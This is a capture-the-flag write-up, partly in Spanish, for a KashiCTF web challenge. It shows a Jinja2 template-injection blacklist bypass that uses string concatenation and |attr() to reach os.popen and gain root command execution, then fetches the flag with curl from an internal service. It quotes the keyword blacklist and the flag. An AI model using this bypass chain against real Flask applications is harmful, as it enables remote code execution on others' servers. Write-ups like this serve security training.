# Lights from the Future

| Campo       | Valor                          |
|-------------|--------------------------------|
| Plataforma  | KashiCTF 2026                  |
| Categoría   | web                            |
| Dificultad  | Medium                         |

## Descripcion
> The lights from the future has come, can you intercept it and modify to save the present?

## TL;DR
Jinja2 SSTI with keyword blacklist bypass using string concatenation (`~`) and `|attr()` filter. RCE via `os.popen` to fetch flag from internal flag service.

## Analisis inicial

```
$ curl -sv http://34.126.223.46:17621/ 2>&1 | head
Server: Werkzeug/3.1.7 Python/3.11.15
```

Flask app that takes a `message` POST parameter, renders it through `render_template_string()` (SSTI), generates a PNG image with the rendered text via Pillow/PIL.

## Vulnerabilidad identificada
**CWE-1336: Server-Side Template Injection (SSTI)** in Jinja2 via `render_template_string(message)`.

### Blacklist (case-insensitive substring check)
```python
BLACKLIST = [
    "__class__", "__mro__", "__init__", "__globals__", "__builtins__",
    "__subclasses__", "__import__", "os", "eval", "exec", "system",
    "subprocess", "popen", "config"
]
```

## Proceso de resolucion

### Paso 1: Confirmar SSTI
```
POST / HTTP/1.1
message={{7*7}}
```
PNG renders `49` — confirmed Jinja2 SSTI.

### Paso 2: Mapear blacklist
Tested each dunder and keyword individually by checking if response is `image/png` (allowed) or `text/html` (blocked "Invalid input").

### Paso 3: Bypass via string concatenation
Jinja2's `~` operator concatenates strings. Combined with `|attr()` filter and `{%set%}` variables:

```jinja2
{%set cl="__cl"~"ass__"%}     {# builds "__class__" #}
{%set mr="__mr"~"o__"%}       {# builds "__mro__" #}
{%set sc="__subcl"~"asses__"%} {# builds "__subclasses__" #}
{%set ini="__in"~"it__"%}     {# builds "__init__" #}
{%set gl="__glo"~"bals__"%}   {# builds "__globals__" #}
{%set bu="__buil"~"tins__"%}  {# builds "__builtins__" #}
{%set im="__impo"~"rt__"%}    {# builds "__import__" #}
{%set pp="po"~"pen"%}         {# builds "popen" #}
```

### Paso 4: Build exploit chain
```
"" -> str class -> object (MRO[1]) -> subclasses -> catch_warnings
   -> __init__.__globals__["__builtins__"]["__import__"]("os") -> popen(cmd)
```

Key syntax issue: `|attr(pp)("cmd")` doesn't work in Jinja2 filter chain — need intermediate `{%set%}`:
```jinja2
{%set omod=...builtins[im]("o"~"s")%}
{%set pfn=(omod|attr(pp))%}
{{pfn("id").read()}}
```

### Paso 5: RCE confirmed
```
uid=0(root) gid=0(root) groups=0(root)
```

### Paso 6: Find and read flag
Read `start.sh` — flag fetched from internal service at container startup:
```sh
service=http://172.17.0.1:9512
flag=$(curl -s --fail "$service/flag?chal_id=$CHALLENGE_ID&team_id=$TEAM_ID") || exit 1
echo "$flag" > /flag.txt
```

Fetched flag directly via RCE + SSRF:
```
curl -s http://172.17.0.1:9512/flag?chal_id=33&team_id=160
```

## Approaches descartados
- Direct `open("/flag.txt").read()` via SSTI — worked but flag service hadn't populated it correctly at container start
- `os.popen` via `|attr(pp)("cmd").read()` directly in Jinja2 filter chain — syntax issue, had to use intermediate `{%set%}` variable
- `urllib.request.urlopen` for SSRF — `__import__("urllib.request")` returns wrong module in Python

## Flag
```
kashiCTF{hSdfU1JGnFWcdOktpo8v6kJB9l30nD}
```

## Key Lessons
- Jinja2 `|attr()` filter + `~` string concat bypasses any substring-based keyword blacklist
- `|attr(name)(args)` doesn't parse correctly in Jinja2 — use `{%set fn=(obj|attr(name))%}{{fn(args)}}` instead
- `os.popen` shell `&` must be escaped or quoted when building shell commands via SSTI
- KashiCTF uses internal flag service at `172.17.0.1:9512` — flag may not be available immediately at startup
